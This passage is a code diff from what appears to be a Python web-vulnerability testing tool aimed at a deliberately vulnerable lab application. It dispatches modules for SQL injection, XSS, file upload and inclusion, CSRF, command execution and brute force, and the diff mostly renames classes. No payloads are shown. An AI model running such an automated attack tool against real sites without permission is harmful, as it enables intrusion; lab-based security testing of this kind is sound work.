 
   if 'security' in e and basesql:
     level = e['security']
+
     if level == "low":
       sql_error_test(url,cookies=e)
       return
@@ -2179,6 +1200,7 @@ def options_get(url,cookie_name,cookie_value,basesql,blindsql \
       print("impossible level is safe code,not need to test")
     else:
       print("wrong level has been set")
+
   if 'security' not in e:
     print("missing security level cookies")
 
@@ -2195,39 +1217,45 @@ def options_get(url,cookie_name,cookie_value,basesql,blindsql \
       return
 
   if xss_reflected:
-    trigger = Gun(url,cookies=e)
+    trigger = Xss_r(url,cookies=e)
     trigger.Trigger()
     return
 
   elif xss_stored:
-    other_trigger = Other_Gun(url,cookies=e)
+    other_trigger = Xss_s(url,cookies=e)
     other_trigger.Other_Trigger()
     return
 
   elif xss_dom:
-    dom = DOM(url,cookies=e)
+    dom = Xss_d(url,cookies=e)
     dom.dom()
     return
+
   elif weak_session:
     session = SESSION(url,cookies=e)
     session.session()
     return
+
   elif file_upload:
     File = FILE(url,cookies=e)
     File.file()
     return
+
   elif file_include:
     include = Include(url,cookies=e)
     include.include()
     return
+
   elif csrf:
     csrf  = CSRF_GENERATE(url,cookies=e)
     csrf.generate()
     return
+
   elif command_execute:
     command = Command_Execute(url,cookies=e)
     command.execute()
     return
+
   elif brute_force:
     brute = Brute(url,cookies=e)
     brute.force()
